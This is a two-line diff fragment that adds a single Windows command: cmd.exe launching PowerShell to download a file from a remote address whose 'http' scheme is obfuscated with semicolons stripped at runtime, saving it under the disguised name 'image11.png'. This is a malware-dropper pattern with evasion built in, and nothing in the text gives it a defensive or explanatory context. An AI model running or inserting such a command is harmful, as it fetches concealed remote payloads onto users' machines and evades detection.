@@ -1,0 +1,2 @@
+cmd.exe /C powershell.exe (new-object System.Net.WebClient).DownloadFile(('htt;p://media-cache-ec0/*.txt' -replace ';',''),'image11.png')
+
